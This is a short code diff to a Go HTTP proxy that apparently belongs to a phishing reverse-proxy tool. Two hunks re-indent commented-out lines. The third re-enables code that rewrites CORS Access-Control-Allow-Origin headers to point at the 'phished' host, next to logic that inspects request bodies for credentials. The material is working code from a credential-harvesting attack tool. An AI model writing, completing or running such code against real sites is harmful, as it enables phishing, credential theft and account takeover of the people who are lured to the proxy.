@@ -413,7 +413,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-			// 	// req.Header.Set(p.getHomeDir(), o_host)
+				// 	// req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -610,7 +610,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-			// 		// req.Header.Set(p.getHomeDir(), o_host)
+					// 		// req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -805,8 +805,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
 				if u, err := url.Parse(allow_origin); err == nil {
-			// 		if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
-			// 			resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
+					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
+						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
 					}
 				} else {
 					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
